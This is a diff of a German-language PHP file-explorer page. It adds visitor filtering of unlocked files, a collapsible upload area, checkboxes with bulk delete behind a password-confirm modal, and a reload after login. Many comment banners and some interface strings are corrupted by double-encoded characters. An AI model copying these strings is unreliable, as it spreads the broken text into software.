-            if ($s !== '.' && $s !== '..' && is_dir($f['path'] . DIRECTORY_SEPARATOR . $s)) { $hasSub = true; break; }
+            if ($s !== '.' && $s !== '..' && is_dir($f['path'] . DIRECTORY_SEPARATOR . $s)) {
+                if ($vl > 0 || hasUnlockedFiles($f['path'] . DIRECTORY_SEPARATOR . $s, $root, $unlocked))
+                    { $hasSub = true; break; }
+            }
         echo '<li class="fi"><div class="fr' . ($isActive ? ' active' : '') . '">';
         if ($hasSub)
             echo '<button class="tb" data-bs-toggle="collapse" data-bs-target="#'.$id.'" aria-expanded="'.($isOpen?'true':'false').'">'
@@ -274,7 +330,7 @@ function listFolders(string $dir, string $root, int $level = 0): void {
         echo '</div>';
         if ($hasSub) {
             echo '<div class="collapse'.($isOpen?' show':'').'" id="'.$id.'">';
-            listFolders($f['path'], $root, $level + 1);
+            listFolders($f['path'], $root, $level + 1, $unlocked, $vl);
             echo '</div>';
         }
         echo '</li>';
@@ -313,6 +369,12 @@ function fmtSize(int $b): string {
 
 $directFiles = getFiles($current);
 $files       = empty($directFiles) ? getFilesRecursive($current) : $directFiles;
+if ($viewLevel === 0) {
+    $files = array_values(array_filter($files, function($f) use ($unlocked, $root) {
+        $rel = str_replace(DIRECTORY_SEPARATOR, '/', str_replace($root . DIRECTORY_SEPARATOR, '', $f['path']));
+        return in_array($rel, $unlocked);
+    }));
+}
 
 usort($files, function($a, $b) use ($pinned, $root) {
     $ra = str_replace(DIRECTORY_SEPARATOR, '/', str_replace($root . DIRECTORY_SEPARATOR, '', $a['path']));
@@ -419,16 +481,33 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
 .sort-btn.active{background:#6366f1;border-color:#6366f1;color:#fff}
 /* Upload zone */
 .up-zone{display:none;margin-bottom:1.25rem}
-#mainContent.level-2 .up-zone{display:block}
-.up-drop{border:2px dashed var(--brd);border-radius:12px;padding:1.5rem;text-align:center;cursor:pointer;transition:border-color .2s,background .2s;color:var(--mut)}
+#mainContent.level-1 .up-zone,#mainContent.level-2 .up-zone{display:block}
+.up-toggle{background:var(--bbg);border:1px solid var(--brd);border-radius:8px;padding:.35rem .85rem;font-size:.8rem;font-weight:600;color:var(--btxt);cursor:pointer;display:flex;align-items:center;gap:.4rem;transition:background .15s}
+.up-toggle:hover{background:var(--hov);color:var(--txt)}
+.up-body{margin-top:.6rem;display:none}
+.up-body.open{display:block}
+.up-drop{border:2px dashed var(--brd);border-radius:10px;padding:1rem;text-align:center;cursor:pointer;transition:border-color .2s,background .2s;color:var(--mut)}
 .up-drop:hover,.up-drop.drag{border-color:#6366f1;background:rgba(99,102,241,.05);color:#6366f1}
-.up-drop i{font-size:1.8rem;margin-bottom:.4rem;display:block}
-.up-drop p{margin:0;font-size:.85rem}
+.up-drop i{font-size:1.4rem;margin-bottom:.25rem;display:block}
+.up-drop p{margin:0;font-size:.82rem}
 .up-lbl{color:#6366f1;cursor:pointer;text-decoration:underline}
-.up-status{margin-top:.5rem;font-size:.8rem}
-.up-item{display:flex;align-items:center;gap:.4rem;padding:.2rem 0;color:var(--mut)}
+.up-status{margin-top:.4rem;font-size:.78rem}
+.up-item{display:flex;align-items:center;gap:.4rem;padding:.15rem 0;color:var(--mut)}
 .up-item.ok{color:#10b981}
 .up-item.err{color:#ef4444}
+/* Checkboxes */
+.cb-col{width:32px;padding:.65rem .5rem .65rem .8rem !important}
+.fchk{width:15px;height:15px;cursor:pointer;accent-color:#6366f1}
+.cb-col.hidden,.fchk.hidden{display:none}
+#mainContent.level-1 .cb-col,#mainContent.level-2 .cb-col{display:table-cell}
+/* Bulk toolbar */
+.bulk-bar{display:none;position:fixed;bottom:2.5rem;left:50%;transform:translateX(-50%);background:#1a1d2e;border:1px solid #3730a3;border-radius:12px;padding:.6rem 1rem;gap:.75rem;align-items:center;box-shadow:0 8px 24px rgba(0,0,0,.5);z-index:500;white-space:nowrap}
+.bulk-bar.show{display:flex}
+.bulk-cnt{font-size:.82rem;font-weight:600;color:#a5b4fc}
+.bulk-del{background:#ef4444;border:none;border-radius:7px;padding:.35rem .8rem;font-size:.8rem;font-weight:600;color:#fff;cursor:pointer;display:flex;align-items:center;gap:.3rem;transition:background .15s}
+.bulk-del:hover{background:#dc2626}
+.bulk-cancel{background:none;border:1px solid rgba(255,255,255,.15);border-radius:7px;padding:.3rem .5rem;color:var(--mut);cursor:pointer;font-size:.8rem;transition:background .15s}
+.bulk-cancel:hover{background:rgba(255,255,255,.08)}
 /* Error */
 .err-box{display:flex;align-items:flex-start;gap:1rem;background:#fff1f1;border:1px solid #fcd5d5;border-radius:10px;padding:1rem 1.25rem;margin-bottom:1.25rem}
 [data-theme=dark] .err-box{background:#2c1a1a;border-color:#5c2e2e}
@@ -455,7 +534,7 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
 .fp{color:var(--mut);font-size:.8rem;font-family:monospace}
 .pin-ico{color:#f59e0b;font-size:.75rem;margin-left:.2rem}
 .fac{display:flex;align-items:center;gap:.35rem;white-space:nowrap;flex-wrap:wrap}
-/* Buttons â€” default (user, level 0) */
+/* Buttons Ã¢â‚¬â€ default (user, level 0) */
 .btn-lock{display:inline-flex;align-items:center;gap:.3rem;padding:.3rem .65rem;border-radius:6px;font-size:.75rem;font-weight:600;background:transparent;border:1.5px solid var(--mut);color:var(--mut);cursor:default}
 .btn-o{display:none;align-items:center;gap:.3rem;padding:.3rem .65rem;border-radius:6px;font-size:.75rem;font-weight:600;background:transparent;border:1.5px solid #6366f1;color:#6366f1;text-decoration:none;cursor:pointer;transition:background .15s,color .15s}
 .btn-o:hover{background:#6366f1;color:#fff}
@@ -563,7 +642,7 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
     <a class="root-lnk <?= ($current === $root ? 'active' : '') ?>" href="?">
       <i class="bi bi-house-door-fill"></i> Root
     </a>
-    <?php listFolders($root, $root); ?>
+    <?php listFolders($root, $root, 0, $unlocked, $viewLevel); ?>
   </nav>
 
   <main class="main" id="mainContent">
@@ -605,12 +684,18 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
 
     <!-- Upload zone (admin only) -->
     <div class="up-zone">
-      <div class="up-drop" id="upDrop">
-        <i class="bi bi-cloud-upload"></i>
-        <p>Dateien hierher ziehen oder <label for="upInp" class="up-lbl">ausw&auml;hlen</label></p>
-        <input type="file" id="upInp" multiple accept=".php,.html,.htm,.css,.js,.txt,.json,.md" style="display:none">
+      <button class="up-toggle" id="upToggle" onclick="toggleUpload()">
+        <i class="bi bi-cloud-upload"></i> Hochladen
+        <i class="bi bi-chevron-down" id="upChev" style="font-size:.7rem;margin-left:.2rem"></i>
+      </button>
+      <div class="up-body" id="upBody">
+        <div class="up-drop" id="upDrop">
+          <i class="bi bi-cloud-upload"></i>
+          <p>Hierher ziehen oder <label for="upInp" class="up-lbl">ausw&auml;hlen</label></p>
+          <input type="file" id="upInp" multiple accept=".php,.html,.htm,.css,.js,.txt,.json,.md" style="display:none">
+        </div>
+        <div class="up-status" id="upStatus"></div>
       </div>
-      <div class="up-status" id="upStatus"></div>
     </div>
 
     <!-- Search + sort -->
@@ -642,6 +727,7 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
       <table class="ftbl" id="fileTable">
         <thead>
           <tr>
+            <th class="cb-col"><input type="checkbox" id="cbAll" class="fchk" title="Alle ausw&auml;hlen"></th>
             <th onclick="setSort('name')">Dateiname <span class="sort-ind bi bi-chevron-expand"></span></th>
             <th class="fp">Pfad</th>
             <th onclick="setSort('size')" style="white-space:nowrap">Gr&ouml;&szlig;e <span class="sort-ind bi bi-chevron-expand"></span></th>
@@ -671,6 +757,7 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
             data-size="<?= $file['size'] ?>"
             data-date="<?= $file['mtime'] ?>"
             data-path="<?= htmlspecialchars($relPath) ?>">
+          <td class="cb-col"><input type="checkbox" class="fchk row-cb" value="<?= htmlspecialchars($relPath) ?>" onclick="event.stopPropagation();updateBulk()"></td>
           <td>
             <div class="fn">
               <i class="bi <?= $ico ?>"></i>
@@ -723,6 +810,26 @@ body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Bl
 <div class="ver">v<?= _VER ?></div>
 <div class="toast-n" id="toastEl"><i class="bi" id="toastIco"></i><span id="toastMsg"></span></div>
 
+<!-- Bulk Toolbar -->
+<div class="bulk-bar" id="bulkBar">
+  <span class="bulk-cnt" id="bulkCnt">0 ausgew&auml;hlt</span>
+  <button class="bulk-del" onclick="confirmDelete()"><i class="bi bi-trash3"></i> L&ouml;schen</button>
+  <button class="bulk-cancel" onclick="clearSel()"><i class="bi bi-x"></i></button>
+</div>
+
+<!-- Delete Confirm Modal -->
+<div class="pw-ov" id="delOv">
+  <div class="pw-box">
+    <div class="pw-ico" style="color:#ef4444"><i class="bi bi-trash3"></i></div>
+    <div class="pw-ttl" id="delTtl">Datei wirklich l&ouml;schen?</div>
+    <div class="pw-err" id="delInfo" style="color:var(--mut);margin-bottom:.75rem"></div>
+    <input type="password" id="delPw" class="pw-inp" placeholder="Passwort best&auml;tigen" autocomplete="off" style="display:none;margin-bottom:.5rem">
+    <div class="pw-err" id="delErr"></div>
+    <button class="pw-btn" id="delConfBtn" style="background:#ef4444" onclick="execDelete()">L&ouml;schen</button>
+    <button class="pw-btn" onclick="closeDelOv()" style="margin-top:.5rem;background:transparent;border:1px solid rgba(255,255,255,.15);color:var(--mut);font-size:.8rem">Abbrechen</button>
+  </div>
+</div>
+
 <!-- Login Modal -->
 <div class="pw-ov" id="pwOv">
   <div class="pw-box">
@@ -771,14 +878,14 @@ const _csrf      = '<?= $csrf ?>';
 const _curDir    = <?= json_encode($relCurDir) ?>;
 const _defPw     = <?= $isDefaultPw ? 'true' : 'false' ?>;
 
-// â”€â”€ Dark Mode â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Dark Mode Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 document.getElementById('darkBtn').addEventListener('click', () => {
   const dark = _html.getAttribute('data-theme') !== 'dark';
   _html.setAttribute('data-theme', dark ? 'dark' : 'light');
   document.cookie = 'dk=' + (dark?1:0) + ';path=/;max-age=315360000;SameSite=Lax';
 });
 
-// â”€â”€ Sidebar chevrons â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Sidebar chevrons Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 document.querySelectorAll('.tb').forEach(btn => {
   btn.addEventListener('click', e => { e.preventDefault(); e.stopPropagation(); });
   const tgt = document.querySelector(btn.dataset.bsTarget);
@@ -787,10 +894,10 @@ document.querySelectorAll('.tb').forEach(btn => {
   tgt.addEventListener('hide.bs.collapse', () => btn.querySelector('.ti')?.classList.remove('open'));
 });
 
-// â”€â”€ Brand name â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Brand name Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 (function() {
   const stored = localStorage.getItem('_bn');
-  if (stored) { document.getElementById('brandNm').textContent = stored; document.title = stored + ' Â· Explorer'; }
+  if (stored) { document.getElementById('brandNm').textContent = stored; document.title = stored + ' Ã‚Â· Explorer'; }
 })();
 document.querySelector('.tb-brand').addEventListener('click', e => {
   const tgt = e.target.closest('#brandNm'); if (!tgt) return;
@@ -803,7 +910,7 @@ document.querySelector('.tb-brand').addEventListener('click', e => {
     if (done) return; done = true;
     const val = inp.value.trim() || 'GodLe972';
     localStorage.setItem('_bn', val);
-    document.title = val + ' Â· Explorer';
+    document.title = val + ' Ã‚Â· Explorer';
     const sp = document.createElement('span');
     sp.id = 'brandNm'; sp.className = 'brand-nm'; sp.title = 'Klicken zum Umbenennen'; sp.textContent = val;
     inp.replaceWith(sp);
@@ -812,7 +919,7 @@ document.querySelector('.tb-brand').addEventListener('click', e => {
   inp.addEventListener('keydown', e => { if (e.key==='Enter') inp.blur(); if (e.key==='Escape') { done=true; inp.replaceWith(tgt); } });
 });
 
-// â”€â”€ Toast â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Toast Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 let _toastTimer;
 function showToast(msg, icon, dur) {
   clearTimeout(_toastTimer);
@@ -824,13 +931,14 @@ function showToast(msg, icon, dur) {
 }
 function hideToast() { clearTimeout(_toastTimer); document.getElementById('toastEl').classList.remove('show'); }
 
-// â”€â”€ Auth / Levels â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Auth / Levels Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 let userLevel = 0;
 let _token = sessionStorage.getItem('_st') || '';
 
 if (_token) {
   userLevel = parseInt(sessionStorage.getItem('_sl') || '0', 10);
   applyLevel(userLevel, false);
+  if (userLevel === 1 && _defPw) setTimeout(openCpw, 600);
 }
 
 function openLogin() {
@@ -854,9 +962,9 @@ function applyLevel(lvl, announce) {
     badge.style.borderColor = lvl >= 2 ? 'rgba(99,102,241,.4)'  : 'rgba(16,185,129,.4)';
     badge.style.color       = lvl >= 2 ? '#a5b4fc' : '#6ee7b7';
     if (announce) {
-      showToast(lvl >= 2 ? 'Admin-Modus aktiv' : 'Willkommen, Owner',
+      showToast((lvl >= 2 ? 'Admin' : 'Owner') + ' â€” wird neu geladen ...',
         lvl >= 2 ? 'bi-shield-lock-fill' : 'bi-shield-check');
-      if (lvl === 1 && _defPw) setTimeout(openCpw, 800);
+      setTimeout(() => location.reload(), 900);
     }
   } else {
     badge.classList.remove('show');
@@ -909,16 +1017,16 @@ function closePw() {
   document.getElementById('pwInp').classList.remove('shake');
 }
 
-// â”€â”€ Row click â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Row click Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 document.addEventListener('click', e => {
   const row = e.target.closest('tr.file-row');
   if (!row || e.target.closest('a,button')) return;
   const canOpen = userLevel >= 1 || row.classList.contains('unlocked');
-  if (!canOpen) { showToast('Gesperrt â€” kein Zugriff', 'bi-lock', 2500); return; }
+  if (!canOpen) { showToast('Gesperrt Ã¢â‚¬â€ kein Zugriff', 'bi-lock', 2500); return; }
   window.open(row.dataset.url, '_blank');
 });
 
-// â”€â”€ Toggle unlock â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Toggle unlock Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 async function toggleFile(btn, relPath) {
   const row = btn.closest('tr');
   const fd = new FormData(); fd.append('_t', _token); fd.append('f', relPath);
@@ -931,7 +1039,7 @@ async function toggleFile(btn, relPath) {
     if (data.unlocked) {
       row.classList.add('unlocked');
       i.className = 'bi bi-lock'; s.textContent = 'Sperren'; btn.title = 'Sperren';
-      showToast('Freigegeben fÃ¼r Besucher', 'bi-unlock', 2500);
+      showToast('Freigegeben fÃƒÂ¼r Besucher', 'bi-unlock', 2500);
     } else {
       row.classList.remove('unlocked');
       i.className = 'bi bi-unlock'; s.textContent = 'Freigeben'; btn.title = 'Freigeben';
@@ -940,7 +1048,7 @@ async function toggleFile(btn, relPath) {
   } catch { showToast('Verbindungsfehler', 'bi-wifi-off', 2500); }
 }
 
-// â”€â”€ Pin â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
